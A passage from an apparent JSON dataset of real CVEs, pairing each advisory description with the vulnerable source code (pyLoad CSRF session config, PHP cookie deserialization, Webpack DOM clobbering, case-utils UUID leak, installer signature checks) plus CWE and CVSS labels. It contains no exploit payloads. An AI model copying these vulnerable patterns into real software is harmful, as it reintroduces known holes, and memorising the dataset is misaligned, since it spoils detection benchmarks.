${name}. Please add your full Distinguished Name (DN) to publisherNames configuration`)\n                match = true\n              }\n              if (match) {\n                resolve(null)\n                return\n              }\n            }\n          }\n\n          const result = `publisherNames: ${publisherNames.join(\" | \")}, raw info: ` + JSON.stringify(data, (name, value) => (name === \"RawData\" ? undefined : value), 2)\n          logger.warn(`Sign verification failed, installer signed with incorrect certificate: ${result}`)\n          resolve(result)\n        } catch (e: any) {\n          handleError(logger, e, null, reject)\n          resolve(null)\n          return\n        }\n      }\n    )\n  })\n}\n\nfunction parseOut(out: string): any {\n  const data = JSON.parse(out)\n  delete data.PrivateKey\n  delete data.IsOSBinary\n  delete data.SignatureType\n  const signerCertificate = data.SignerCertificate\n  if (signerCertificate != null) {\n    delete signerCertificate.Archived\n    delete signerCertificate.Extensions\n    delete signerCertificate.Handle\n    delete signerCertificate.HasPrivateKey\n    // duplicates data.SignerCertificate (contains RawData)\n    delete signerCertificate.SubjectName\n  }\n  delete data.Path\n  return data\n}\n\nfunction handleError(logger: Logger, error: Error | null, stderr: string | null, reject: (reason: any) => void): void {\n  if (isOldWin6()) {\n    logger.warn(\n      `Cannot execute Get-AuthenticodeSignature: ${error || stderr}. Ignoring signature validation due to unsupported powershell version. Please upgrade to powershell 3 or higher.`\n    )\n    return\n  }\n\n  try {\n    execFileSync(\"powershell.exe\", [\"-NoProfile\", \"-NonInteractive\", \"-Command\", \"ConvertTo-Json test\"], { timeout: 10 * 1000 } as any)\n  } catch (testError: any) {\n    logger.warn(\n      `Cannot execute ConvertTo-Json: ${testError.message}. Ignoring signature validation due to unsupported powershell version. Please upgrade to powershell 3 or higher.`\n    )\n    return\n  }\n\n  if (error != null) {\n    reject(error)\n  }\n\n  if (stderr) {\n    reject(new Error(`Cannot execute Get-AuthenticodeSignature, stderr: ${stderr}. Failing signature validation due to unknown stderr.`))\n  }\n}\n\nfunction isOldWin6(): boolean {\n  const winVersion = os.release()\n  return winVersion.startsWith(\"6.\") && !winVersion.startsWith(\"6.3\")\n}\n"
        }
      ],
      "method_level": [
        "parseOut"
      ],
      "hunk_level": [
        {
          "line_no": 99,
          "content": "  delete data.Path"
        }
      ]
    },
    "cwe": [
      "CWE-154",
      "CWE-295"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 55,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.1\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, an environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 90,
          "content": "        try:"
        },
        {
          "line_no": 96,
          "content": "        except ValueError:"
        },
        {
          "line_no": 97,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 98,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 95,
    "cve": "CVE-2024-22416",
    "description": "pyLoad is a free and open-source Download Manager written in pure Python. The `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. As a result any API call can be made via a CSRF attack by an unauthenticated user. This issue has been addressed in release `0.5.0b3.dev78`. All users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/pyload/webui/app/__init__.py",
          "content": "# -*- coding: utf-8 -*-\n#       ____________\n#   ___/       |    \\_____________ _                 _ ___\n#  /        ___/    |    _ __ _  _| |   ___  __ _ __| |   \\\n# /    \\___/  ______/   | '_ \\ || | |__/ _ \\/ _` / _` |    \\\n# \\            ◯ |      | .__/\\_, |____\\___/\\__,_\\__,_|    /\n#  \\_______\\    /_______|_|   |__/________________________/\n#           \\  /\n#            \\/\n\nimport os\n\nimport flask\nimport jinja2\nfrom werkzeug.serving import WSGIRequestHandler\n\nfrom .blueprints import BLUEPRINTS\nfrom .config import get_default_config\nfrom .extensions import EXTENSIONS, THEMES\nfrom .filters import TEMPLATE_FILTERS\nfrom .globals import TEMPLATE_GLOBALS\nfrom .handlers import ERROR_HANDLERS\nfrom .processors import CONTEXT_PROCESSORS\n\n\n#: flask app singleton?\nclass App:\n\n    JINJA_TEMPLATE_GLOBALS = TEMPLATE_GLOBALS\n    JINJA_TEMPLATE_FILTERS = TEMPLATE_FILTERS\n    JINJA_CONTEXT_PROCESSORS = CONTEXT_PROCESSORS\n    FLASK_ERROR_HANDLERS = ERROR_HANDLERS\n    FLASK_BLUEPRINTS = BLUEPRINTS\n    FLASK_EXTENSIONS = EXTENSIONS\n    FLASK_THEMES = THEMES\n\n\n    @classmethod\n    def _configure_config(cls, app, develop):\n        conf_obj = get_default_config(develop)\n        app.config.from_object(conf_obj)\n\n    @classmethod\n    def _configure_blueprints(cls, app, path_prefix):\n        for blueprint in cls.FLASK_BLUEPRINTS:\n            url_prefix = path_prefix if not blueprint.url_prefix else None\n            app.register_blueprint(blueprint, url_prefix=url_prefix)\n\n    @classmethod\n    def _configure_extensions(cls, app):\n        for extension in cls.FLASK_EXTENSIONS:\n            extension.init_app(app)\n\n    @classmethod\n    def _configure_themes(cls, app, path_prefix=\"\"):\n        for theme in cls.FLASK_THEMES:\n            theme.init_app(app, path_prefix)\n\n    @classmethod\n    def _configure_handlers(cls, app):\n        \"\"\"\n        Register app handlers.\n        \"\"\"\n        for exc, fn in cls.FLASK_ERROR_HANDLERS:\n            app.register_error_handler(exc, fn)\n\n        @app.after_request\n        def deny_iframe(response):\n            response.headers[\"X-Frame-Options\"] = \"DENY\"\n            return response\n\n    @classmethod\n    def _configure_json_encoding(cls, app):\n        try:\n            from .helpers import JSONProvider\n            app.json = JSONProvider(app)\n\n        except ImportError:\n            from .helpers import JSONEncoder\n            app.json_encoder = JSONEncoder\n\n    @classmethod\n    def _configure_templating(cls, app):\n        tempdir = app.config[\"PYLOAD_API\"].get_cachedir()\n        cache_path = os.path.join(tempdir, \"jinja\")\n\n        os.makedirs(cache_path, exist_ok=True)\n\n        app.create_jinja_environment()\n\n        # NOTE: enable auto escape for all file extensions (including .js)\n        #       maybe this will break .txt rendering, but we don't render this kind of files actually\n        #       that does not change 'default_for_string=False' (by default)\n        app.jinja_env.autoescape = jinja2.select_autoescape(default=True)\n        app.jinja_env.bytecode_cache = jinja2.FileSystemBytecodeCache(cache_path)\n\n        for fn in cls.JINJA_TEMPLATE_FILTERS:\n            app.add_template_filter(fn)\n\n        for fn in cls.JINJA_TEMPLATE_GLOBALS:\n            app.add_template_global(fn)\n\n        for fn in cls.JINJA_CONTEXT_PROCESSORS:\n            app.context_processor(fn)\n\n    @classmethod\n    def _configure_session(cls, app):\n        tempdir = app.config[\"PYLOAD_API\"].get_cachedir()\n        cache_path = os.path.join(tempdir, \"flask\")\n        os.makedirs(cache_path, exist_ok=True)\n\n        app.config[\"SESSION_FILE_DIR\"] = cache_path\n        app.config[\"SESSION_TYPE\"] = \"filesystem\"\n        app.config[\"SESSION_COOKIE_NAME\"] = \"pyload_session\"\n        app.config[\"SESSION_COOKIE_SAMESITE\"] = \"None\"\n        app.config[\"SESSION_COOKIE_SECURE\"] = app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"use_ssl\")\n        app.config[\"SESSION_PERMANENT\"] = False\n\n        session_lifetime = max(app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"session_lifetime\"), 1) * 60\n        app.config[\"PERMANENT_SESSION_LIFETIME\"] = session_lifetime\n\n    @classmethod\n    def _configure_api(cls, app, pycore):\n        app.config[\"PYLOAD_API\"] = pycore.api\n\n    @classmethod\n    def _configure_logging(cls, app, pycore):\n        # Inject our custom logger\n        app.logger = pycore.log.getChild(\"webui\")\n\n    def __new__(cls, pycore, develop=False, path_prefix=None):\n        app = flask.Flask(__name__)\n\n        cls._configure_logging(app, pycore)\n        cls._configure_api(app, pycore)\n        cls._configure_config(app, develop)\n        cls._configure_templating(app)\n        cls._configure_json_encoding(app)\n        cls._configure_session(app)\n        cls._configure_blueprints(app, path_prefix)\n        cls._configure_extensions(app)\n        cls._configure_themes(app, path_prefix or \"\")\n        cls._configure_handlers(app)\n\n        WSGIRequestHandler.protocol_version = \"HTTP/1.1\"\n\n        return app\n"
        }
      ],
      "method_level": [
        "def _configure_session(cls, app):\n        tempdir = app.config[\"PYLOAD_API\"].get_cachedir()\n        cache_path = os.path.join(tempdir, \"flask\")\n        os.makedirs(cache_path, exist_ok=True)\n\n        app.config[\"SESSION_FILE_DIR\"] = cache_path\n        app.config[\"SESSION_TYPE\"] = \"filesystem\"\n        app.config[\"SESSION_COOKIE_NAME\"] = \"pyload_session\"\n        app.config[\"SESSION_COOKIE_SAMESITE\"] = \"None\"\n        app.config[\"SESSION_COOKIE_SECURE\"] = app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"use_ssl\")\n        app.config[\"SESSION_PERMANENT\"] = False\n\n        session_lifetime = max(app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"session_lifetime\"), 1) * 60\n        app.config[\"PERMANENT_SESSION_LIFETIME\"] = session_lifetime"
      ],
      "hunk_level": [
        {
          "line_no": 115,
          "content": "        app.config[\"SESSION_COOKIE_SAMESITE\"] = \"None\""
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.6,
    "cvss_version": 3.1
  },
  {
    "id": 989,
    "cve": "CVE-2024-7067",
    "description": "A vulnerability was found in kirilkirkov Ecommerce-Laravel-Bootstrap up to 1f1097a3448ce8ec53e034ea0f70b8e2a0e64a87. It has been rated as critical. Affected by this issue is the function getCartProductsIds of the file app/Cart.php. The manipulation of the argument laraCart leads to deserialization. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available. The name of the patch is a02111a674ab49f65018b31da3011b1e396f59b1. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-272348.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Cart.php",
          "content": "<?php\n\nnamespace App;\n\nuse App\\Models\\Publics\\ProductsModel;\n\n/**\n * This class manage shopping cart of users\n *\n * @author kiro\n */\nclass Cart\n{\n    /*\n     * 1 month expire time\n     */\n\n    private $cookieExpTime = 2678400;\n    public $countProducts = 0;\n\n    public function addProduct($id, $quantity)\n    {\n        $productsModel = new ProductsModel();\n        if (!isset($_SESSION['laraCart'])) {\n            $_SESSION['laraCart'] = array();\n        }\n        for ($i = 1; $i <= $quantity; $i++) {\n            $_SESSION['laraCart'][] = (int) $id;\n        }\n        setcookie('laraCart', serialize($_SESSION['laraCart']), $this->cookieExpTime);\n    }\n\n    public function removeProductQuantity($id)\n    { \n        if (($key = array_search($id, $_SESSION['laraCart'])) !== false) {\n            unset($_SESSION['laraCart'][$key]);\n        }\n    }\n\n    public function removeProduct($id)\n    {\n        $count = count(array_keys($_SESSION['laraCart'], $id));\n        $i = 1;\n        do {\n            if (($key = array_search($id, $_SESSION['laraCart'])) !== false) {\n                unset($_SESSION['laraCart'][$key]);\n            }\n            $i++;\n        } while ($i <= $count);\n        setcookie('laraCart', serialize($_SESSION['laraCart']), $this->cookieExpTime);\n    }\n\n    public function clearCart()\n    {\n        unset($_SESSION['laraCart']);\n        setcookie('laraCart', null, -1, '/');\n    }\n\n    private function getCartProductsIds()\n    {\n        $products = array();\n        if (!isset($_SESSION['laraCart']) || empty($_SESSION['laraCart'])) {\n            if (isset($_COOKIE['laraCart']) && $_COOKIE['laraCart'] == null && !empty($_COOKIE['laraCart'])) {\n                $_SESSION['laraCart'] = unserialize($_COOKIE['laraCart']);\n            }\n        } else {\n            $products = $_SESSION['laraCart'];\n        }\n        return $products;\n    }\n\n    public function getCartProducts()\n    {\n        $productsModel = new ProductsModel();\n\n        $products_ids = $this->getCartProductsIds();\n        $unique_ids = array_unique($products_ids);\n\n        $products = [];\n        if (!empty($products_ids)) {\n            $products = $productsModel->getProductsWithIds($unique_ids);\n            foreach ($products as &$product) {\n                $counts = array_count_values($products_ids);\n                $numAddedToCart = $counts[$product->id];\n                $product->num_added = $numAddedToCart;\n            }\n        }\n        $this->countProducts = count($products);\n        return $products;\n    }\n\n    public function getCartHtmlWithProducts()\n    {\n        $products = $this->getCartProducts();\n\n        $sum = 0;\n        if (!empty($products)) {\n            $sum = 0;\n            ob_start();\n            include '../resources/views/publics/cartHtml.php';\n            $content = ob_get_contents();\n            ob_end_clean();\n            return $content;\n        } else {\n            return $products;\n        }\n    }\n\n    public function getCartHtmlWithProductsForCheckoutPage()\n    {\n        $products = $this->getCartProducts();\n\n        $sum = 0;\n        if (!empty($products)) {\n            $sum = 0;\n            ob_start();\n            include '../resources/views/publics/cartHtmlForCheckoutPage.php';\n            $content = ob_get_contents();\n            ob_end_clean();\n            return $content;\n        } else {\n            return $products;\n        }\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "private function getCartProductsIds()\n    {\n        $products = array();\n        if (!isset($_SESSION['laraCart']) || empty($_SESSION['laraCart'])) {\n            if (isset($_COOKIE['laraCart']) && $_COOKIE['laraCart'] == null && !empty($_COOKIE['laraCart'])) {\n                $_SESSION['laraCart'] = unserialize($_COOKIE['laraCart']);\n            }\n        } else {\n            $products = $_SESSION['laraCart'];\n        }\n        return $products;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 64,
          "content": "                $_SESSION['laraCart'] = unserialize($_COOKIE['laraCart']);"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 1116,
    "cve": "CVE-2024-43788",
    "description": "Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset. The webpack developers have discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Real-world exploitation of this gadget has been observed in the Canvas LMS which allows a XSS attack to happen through a javascript code compiled by Webpack (the vulnerable part is from Webpack). DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes. This issue has been addressed in release version 5.94.0. All users are advised to upgrade. There are no known workarounds for this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/runtime/AutoPublicPathRuntimeModule.js",
          "content": "/*\n\tMIT License http://www.opensource.org/licenses/mit-license.php\n*/\n\n\"use strict\";\n\nconst RuntimeGlobals = require(\"../RuntimeGlobals\");\nconst RuntimeModule = require(\"../RuntimeModule\");\nconst Template = require(\"../Template\");\nconst JavascriptModulesPlugin = require(\"../javascript/JavascriptModulesPlugin\");\nconst { getUndoPath } = require(\"../util/identifier\");\n\n/** @typedef {import(\"../Chunk\")} Chunk */\n/** @typedef {import(\"../Compilation\")} Compilation */\n\nclass AutoPublicPathRuntimeModule extends RuntimeModule {\n\tconstructor() {\n\t\tsuper(\"publicPath\", RuntimeModule.STAGE_BASIC);\n\t}\n\n\t/**\n\t * @returns {string | null} runtime code\n\t */\n\tgenerate() {\n\t\tconst compilation = /** @type {Compilation} */ (this.compilation);\n\t\tconst { scriptType, importMetaName, path } = compilation.outputOptions;\n\t\tconst chunkName = compilation.getPath(\n\t\t\tJavascriptModulesPlugin.getChunkFilenameTemplate(\n\t\t\t\t/** @type {Chunk} */\n\t\t\t\t(this.chunk),\n\t\t\t\tcompilation.outputOptions\n\t\t\t),\n\t\t\t{\n\t\t\t\tchunk: this.chunk,\n\t\t\t\tcontentHashType: \"javascript\"\n\t\t\t}\n\t\t);\n\t\tconst undoPath = getUndoPath(\n\t\t\tchunkName,\n\t\t\t/** @type {string} */ (path),\n\t\t\tfalse\n\t\t);\n\n\t\treturn Template.asString([\n\t\t\t\"var scriptUrl;\",\n\t\t\tscriptType === \"module\"\n\t\t\t\t? `if (typeof ${importMetaName}.url === \"string\") scriptUrl = ${importMetaName}.url`\n\t\t\t\t: Template.asString([\n\t\t\t\t\t\t`if (${RuntimeGlobals.global}.importScripts) scriptUrl = ${RuntimeGlobals.global}.location + \"\";`,\n\t\t\t\t\t\t`var document = ${RuntimeGlobals.global}.document;`,\n\t\t\t\t\t\t\"if (!scriptUrl && document) {\",\n\t\t\t\t\t\tTemplate.indent([\n\t\t\t\t\t\t\t\"if (document.currentScript)\",\n\t\t\t\t\t\t\tTemplate.indent(\"scriptUrl = document.currentScript.src;\"),\n\t\t\t\t\t\t\t\"if (!scriptUrl) {\",\n\t\t\t\t\t\t\tTemplate.indent([\n\t\t\t\t\t\t\t\t'var scripts = document.getElementsByTagName(\"script\");',\n\t\t\t\t\t\t\t\t\"if(scripts.length) {\",\n\t\t\t\t\t\t\t\tTemplate.indent([\n\t\t\t\t\t\t\t\t\t\"var i = scripts.length - 1;\",\n\t\t\t\t\t\t\t\t\t\"while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\"\n\t\t\t\t\t\t\t\t]),\n\t\t\t\t\t\t\t\t\"}\"\n\t\t\t\t\t\t\t]),\n\t\t\t\t\t\t\t\"}\"\n\t\t\t\t\t\t]),\n\t\t\t\t\t\t\"}\"\n\t\t\t\t\t]),\n\t\t\t\"// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\",\n\t\t\t'// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.',\n\t\t\t'if (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");',\n\t\t\t'scriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\\\?.*$/, \"\").replace(/\\\\/[^\\\\/]+$/, \"/\");',\n\t\t\t!undoPath\n\t\t\t\t? `${RuntimeGlobals.publicPath} = scriptUrl;`\n\t\t\t\t: `${RuntimeGlobals.publicPath} = scriptUrl + ${JSON.stringify(\n\t\t\t\t\t\tundoPath\n\t\t\t\t\t)};`\n\t\t]);\n\t}\n}\n\nmodule.exports = AutoPublicPathRuntimeModule;\n"
        }
      ],
      "method_level": [
        "generate() {\n\t\tconst compilation = /** @type {Compilation} */ (this.compilation);\n\t\tconst { scriptType, importMetaName, path } = compilation.outputOptions;\n\t\tconst chunkName = compilation.getPath(\n\t\t\tJavascriptModulesPlugin.getChunkFilenameTemplate(\n\t\t\t\t/** @type {Chunk} */\n\t\t\t\t(this.chunk),\n\t\t\t\tcompilation.outputOptions\n\t\t\t),\n\t\t\t{\n\t\t\t\tchunk: this.chunk,\n\t\t\t\tcontentHashType: \"javascript\"\n\t\t\t}\n\t\t);\n\t\tconst undoPath = getUndoPath(\n\t\t\tchunkName,\n\t\t\t/** @type {string} */ (path),\n\t\t\tfalse\n\t\t);\n\n\t\treturn Template.asString([\n\t\t\t\"var scriptUrl;\",\n\t\t\tscriptType === \"module\"\n\t\t\t\t? `if (typeof ${importMetaName}.url === \"string\") scriptUrl = ${importMetaName}.url`\n\t\t\t\t: Template.asString([\n\t\t\t\t\t\t`if (${RuntimeGlobals.global}.importScripts) scriptUrl = ${RuntimeGlobals.global}.location + \"\";`,\n\t\t\t\t\t\t`var document = ${RuntimeGlobals.global}.document;`,\n\t\t\t\t\t\t\"if (!scriptUrl && document) {\",\n\t\t\t\t\t\tTemplate.indent([\n\t\t\t\t\t\t\t\"if (document.currentScript)\",\n\t\t\t\t\t\t\tTemplate.indent(\"scriptUrl = document.currentScript.src;\"),\n\t\t\t\t\t\t\t\"if (!scriptUrl) {\",\n\t\t\t\t\t\t\tTemplate.indent([\n\t\t\t\t\t\t\t\t'var scripts = document.getElementsByTagName(\"script\");',\n\t\t\t\t\t\t\t\t\"if(scripts.length) {\",\n\t\t\t\t\t\t\t\tTemplate.indent([\n\t\t\t\t\t\t\t\t\t\"var i = scripts.length - 1;\",\n\t\t\t\t\t\t\t\t\t\"while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\"\n\t\t\t\t\t\t\t\t]),\n\t\t\t\t\t\t\t\t\"}\"\n\t\t\t\t\t\t\t]),\n\t\t\t\t\t\t\t\"}\"\n\t\t\t\t\t\t]),\n\t\t\t\t\t\t\"}\"\n\t\t\t\t\t]),\n\t\t\t\"// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\",\n\t\t\t'// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.',\n\t\t\t'if (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");',\n\t\t\t'scriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\\\?.*$/, \"\").replace(/\\\\/[^\\\\/]+$/, 